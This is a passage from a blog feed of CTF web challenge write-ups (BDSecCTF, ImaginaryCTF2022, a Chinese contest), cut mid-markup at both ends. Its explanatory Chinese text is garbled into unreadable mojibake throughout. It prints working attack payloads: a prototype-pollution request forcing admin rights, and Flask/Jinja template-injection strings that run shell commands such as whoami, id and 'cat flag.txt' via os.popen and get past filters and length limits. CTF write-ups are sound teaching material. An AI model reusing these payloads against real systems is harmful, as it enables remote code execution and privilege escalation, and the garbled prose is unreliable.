class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­&#x2F;api&#x2F;v1&#x2F;sellå­˜åœ¨<code>åŸå‹é“¾æ±¡æŸ“</code></p><p>ç¬¬ä¸€æ­¥ï¼Œé€šè¿‡é“¾æ±¡æŸ“ä¿®æ”¹<code>req.session.adminä¸ºtrue</code>ï¼Œè¦†ç›–flagsçš„priceä¸º1</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144112916.png" alt="image-20220721144112916"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/sell HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">48</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;__proto__&quot;:&#123;&quot;admin&quot;:true&#125;,&quot;flags&quot;:&#123;&quot;price&quot;:1&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721143941235.png" alt="image-20220721143941235"></p><p>é€ æˆçš„ç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220721144203842.png" alt="image-20220721144203842"></p><p>ç¬¬äºŒæ­¥ï¼Œç›´æ¥è´­ä¹°flagsï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/buy HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">206.189</span>.<span class="number">236.145</span>:<span class="number">3000</span></span><br><span class="line">Content-Length: <span class="number">32</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">5060.114</span> Safari/<span class="number">537.36</span> Edg/<span class="number">103.0</span>.<span class="number">1264.62</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Origin: http://206.189.236.145:3000</span></span><br><span class="line"><span class="comment">Referer: http://206.189.236.145:3000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: connect.sid=s%3AhXJloF5ZCExKQ8ackKCPnlbWgVmBlFUx.63vNgL4nwnZ31RWXUsA9JNCPngfkG7XARAhedfxam0M</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;&quot;product&quot;:&quot;flags&quot;,&quot;quantity&quot;:1&#125;</span></span><br></pre></td></tr></table></figure><p><img src="E:\markdown\img\image-20220721144002542-16613913650561.png" alt="image-20220721144002542"></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> BDSecCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ImaginaryCTF2022-Web</title>
      <link href="/2022/07/19/ImaginaryCTF2022-Web/"/>
      <url>/2022/07/19/ImaginaryCTF2022-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="ImaginaryCTF2022"><a href="#ImaginaryCTF2022" class="headerlink" title="ImaginaryCTF2022"></a>ImaginaryCTF2022</h1><p>[toc]</p><p>å¹³å°é“¾æ¥ï¼š<a href="https://2022.imaginaryctf.org/">Home Page - ImaginaryCTF</a></p><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><p>çç‚¹ï¼Œå‡ºç°äº†</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225522358.png" alt="image-20220719225522358"></p><p>ç„¶åæœç´¢alertï¼Œå‘ç°è¿™ä¸ªä¸œè¥¿</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220716231559412.png" alt="image-20220716231559412"></p><p>æ§åˆ¶å°æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">motSusfunclion</span>()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719101656785.png" alt="image-20220719101656785"></p><h2 id="rooCookie"><a href="#rooCookie" class="headerlink" title="rooCookie"></a>rooCookie</h2><p>å…³é”®ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createToken</span>(<span class="params">text</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text.<span class="property">length</span>; i++) &#123;</span><br><span class="line">encrypted += ((text[i].<span class="title function_">charCodeAt</span>(<span class="number">0</span>)-<span class="number">43</span>+<span class="number">1337</span>) &gt;&gt; <span class="number">0</span>).<span class="title function_">toString</span>(<span class="number">2</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">cookie</span> = encrypted</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;token=101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000&quot;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å·²çŸ¥çš„æ˜¯åŠ å¯†åçš„æ•°æ®ï¼Œæˆ‘ä»¬æ ¹æ®è¿™ä¸ªä¿¡æ¯æ¥å†™é€†å‘è§£å¯†è„šæœ¬</p><p>ç›¸å…³å‡½æ•°</p><p>charCodeAt() æ–¹æ³•å¯è¿”å›æŒ‡å®šä½ç½®çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚è¿™ä¸ªè¿”å›å€¼æ˜¯ 0 - 65535 ä¹‹é—´çš„æ•´æ•°ã€‚</p><p>æ ¹æ®å¯æ˜¾ç¤ºå­—ç¬¦å¯¹åº”çš„æ˜¯32åˆ°127å·¦å³çš„å­—ç¬¦ï¼ŒåŒæ—¶-43+1337ä¹Ÿå°±æ˜¯+1294ï¼Œæ‰€ä»¥å¯ä»¥æ ¹æ®è¿™ä¸ªåˆ¤æ–­è½¬ä¸ºäºŒè¿›åˆ¶åï¼Œéƒ½æ˜¯11ä½çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004344083.png" alt="image-20220719004344083"></p><p>ç„¶åå†™é€†å‘è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cut_text</span>(<span class="params">text,lenth</span>):</span><br><span class="line">  textArr = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(lenth)+<span class="string">&#x27;&#125;&#x27;</span>, text)</span><br><span class="line">  textArr.append(text[(<span class="built_in">len</span>(textArr)*lenth):])</span><br><span class="line">  <span class="keyword">return</span> textArr</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cut_text(token,<span class="number">11</span>)) <span class="comment"># åˆ†ä¸º57ä¸ªé•¿åº¦ä¸º11çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">s = cut_text(token,<span class="number">11</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">  a = <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b&#x27;</span>+i,<span class="number">2</span>)-<span class="number">1294</span>)</span><br><span class="line">  flag += a</span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719004426066.png" alt="image-20220719004426066"></p><p>username&#x3D;â€rooâ€ &amp; password&#x3D;â€ictf{h0p3_7ha7_wa5n7_t00_b4d}â€</p><h2 id="minigolf"><a href="#minigolf" class="headerlink" title="minigolf"></a>minigolf</h2><p>é¢˜ç›®å¾ˆæ˜æ˜¾ï¼Œflaskæ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>[&quot;&#123;&#123;", "&#125;&#125;&quot;, &quot;[&quot;, &quot;]&quot;, &quot;_&quot;]</code>ï¼ŒåŒæ—¶å­—ç¬¦ä¸²é•¿åº¦é™åˆ¶äº†69</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;_&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">  <span class="built_in">print</span>(request.args)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;txt&quot;</span> <span class="keyword">in</span> request.args.keys():</span><br><span class="line">    txt = html.escape(request.args[<span class="string">&quot;txt&quot;</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([n <span class="keyword">in</span> txt <span class="keyword">for</span> n <span class="keyword">in</span> blacklist]):</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(txt) &lt;= <span class="number">69</span>:</span><br><span class="line">      <span class="keyword">return</span> render_template_string(txt)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Too long.&quot;</span></span><br><span class="line">  <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨config.update</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=ls</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719203914568.png" alt="image-20220719203914568"></p><p>ç„¶åå°†ç¬¬äºŒä¸ªä¿®æ”¹ä¸º<code>cat flag.txt</code></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>%20config.update(a=request.args.a)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;a=__globals__</span><br><span class="line">&#123;%<span class="keyword">if</span>%20config.update(g=request.args.g)==<span class="number">1</span>%<span class="number">20</span>%&#125;<span class="number">1</span>&#123;%%20endif%&#125;&amp;g=cat%20flag.txt</span><br><span class="line">&#123;%<span class="built_in">print</span>(lipsum|attr(config.a)).os.popen(config.g).read()%&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719204058013.png" alt="image-20220719204058013"></p><h2 id="Democracy"><a href="#Democracy" class="headerlink" title="Democracy"></a>Democracy</h2><p>ç›´æ¥å°±æ˜¾ç¤ºflagäº†</p><p><code>ictf&#123;i&#39;m_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...&#125;</code></p><h2 id="SSTI-Golf"><a href="#SSTI-Golf" class="headerlink" title="SSTI Golf"></a>SSTI Golf</h2><p>pythonçš„æ¨¡æ¿æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>] <span class="keyword">if</span> <span class="string">&#x27;query&#x27;</span> <span class="keyword">in</span> request.args <span class="keyword">else</span> <span class="string">&#x27;...&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">48</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;7*7&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾49</p><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27whoami%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>å›æ˜¾rootï¼Œå°†å‘½ä»¤æ¢ä¸º<code>cat *</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//sstigolf.chal.imaginaryctf.org/ssti?query=&#123;&#123;lipsum.__globals__.os.popen(%27cat%20*%27).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220718223727617.png" alt="image-20220718223727617"></p><p>ictf{F!1+3r5s!?}</p><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>ä½¿ç”¨<code>config.update</code>ï¼Œå°†ç›¸å…³å‡½æ•°å†™å…¥configä¸­</p><p>æœ¬é¢˜å› ä¸ºé™åˆ¶äº†å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ‰€ä»¥ä½¿ç”¨å³å¯</p><p>ä¸‹é¢è¿™ä¸ªå·²çŸ¥ä¿®æ”¹configä¸­açš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(a=lipsum)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__globals__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].__builtins__)&#125;&#125;</span><br><span class="line">&#123;&#123;config.update(a=config[%27a%<span class="number">27</span>].<span class="built_in">eval</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a(request.args.b)&#125;&#125;&amp;b=<span class="built_in">__import__</span>(%27os%<span class="number">27</span>).popen(%27<span class="built_in">id</span>%<span class="number">27</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202212921.png" alt="image-20220719202212921"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.update(&#123;<span class="string">&quot;a&quot;</span>:cycler.__init__&#125;)&#125;&#125;</span><br><span class="line">&#123;&#123;config.a.__globals__.os.popen(<span class="string">&quot;nl%20*&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719202324050.png" alt="image-20220719202324050"></p><p>ä¸‹é¢è¿™ä¸ªé¢˜ç›®ä¸æ˜¯è¯¥æ¯”èµ›ä¸­çš„é¢˜ç›®ï¼Œæ˜¯è¿™ä¸ªå¹³å°daily challengeé‡Œé¢çš„ä¸€ä¸ªé¢˜ç›®</p><h2 id="daliy-challenge"><a href="#daliy-challenge" class="headerlink" title="daliy challenge"></a>daliy challenge</h2><h3 id="Almost-SSTI"><a href="#Almost-SSTI" class="headerlink" title="Almost SSTI"></a>Almost SSTI</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    query = request.args[<span class="string">&#x27;query&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(query) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(query)</span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">3002</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>debugæ¨¡å¼æ˜¯å¼€å¯çš„ï¼Œæ„é€ æŠ¥é”™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//puzzler7.imaginaryctf.org:3002/ssti?query[]=</span></span><br><span class="line"><span class="title function_ invoke__">__import__</span>(<span class="string">&quot;os&quot;</span>).<span class="title function_ invoke__">popen</span>(<span class="string">&quot;ls&quot;</span>).read</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220719225636877.png" alt="image-20220719225636877"></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ImaginaryCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´è“è´å›½é™…åˆ›æ–°åˆ›ä¸šå¤§èµ›æ•°å­—æŠ€æœ¯+ä¿¡æ¯å®‰å…¨é¢†åŸŸèµ›é“ç½‘ç»œæ”»é˜²å¤§èµ›wp</title>
      <link href="/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/"/>
      <url>/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2022å¹´è“è´å›½é™…åˆ›æ–°åˆ›ä¸šå¤§èµ›â€œæ•°å­—æŠ€æœ¯-ä¿¡æ¯å®‰å…¨é¢†åŸŸèµ›é“ç½‘ç»œæ”»é˜²å¤§èµ›â€wp"><a href="#2022å¹´è“è´å›½é™…åˆ›æ–°åˆ›ä¸šå¤§èµ›â€œæ•°å­—æŠ€æœ¯-ä¿¡æ¯å®‰å…¨é¢†åŸŸèµ›é“ç½‘ç»œæ”»é˜²å¤§èµ›â€wp" class="headerlink" title="2022å¹´è“è´å›½é™…åˆ›æ–°åˆ›ä¸šå¤§èµ›â€œæ•°å­—æŠ€æœ¯+ä¿¡æ¯å®‰å…¨é¢†åŸŸèµ›é“ç½‘ç»œæ”»é˜²å¤§èµ›â€wp"></a>2022å¹´è“è´å›½é™…åˆ›æ–°åˆ›ä¸šå¤§èµ›â€œæ•°å­—æŠ€æœ¯+ä¿¡æ¯å®‰å…¨é¢†åŸŸèµ›é“ç½‘ç»œæ”»é˜²å¤§èµ›â€wp</h1><h2 id="mine"><a href="#mine" class="headerlink" title="mine"></a>mine</h2><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353647.png" alt="img"></p><p>æ³¨æ„è§‚å¯Ÿè¿™ä¸ªç¬¦å·ï¼Œå¯¹åº”çš„æ˜¯src.jsä¸­çš„res&#x2F;face_normal.bmp</p><p>è¿›è¡ŒæŸ¥æ‰¾åˆ«çš„faceï¼Œå‘ç°æœ‰face_success.bmp</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353993.png" alt="img"></p><p>é¦–å…ˆè¿›è¡Œhexè§£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353310.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LJWXQ2C2GN2FKYKXGVXGGMTIGFGUQTJQMIZHQ3CJK42GQYKHKZ2VIQ2GN5MVGRTKJVKEEMSZLBFDS===</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œbase32è§£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353317.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tUaW5nc2h1MHM0b2xlIW4haGVuTCFoYSFjMTB2YXJ9</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œbase64è§£ç </p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353893.png" alt="img"></p><p>flag{Tingshu0s4ole!n!henL!ha!c10var}</p><h2 id="cook"><a href="#cook" class="headerlink" title="cook"></a>cook</h2><p>æŸ¥çœ‹cookie</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353837.png" alt="img"></p><p>ç„¶åè®¿é—®7815696ecbf1c96e6894b779456d330e.php</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207152353401.png" alt="img"></p><p>flag{c7a4c2050907de3b70c519287f171f35}</p><h2 id="upload-inc"><a href="#upload-inc" class="headerlink" 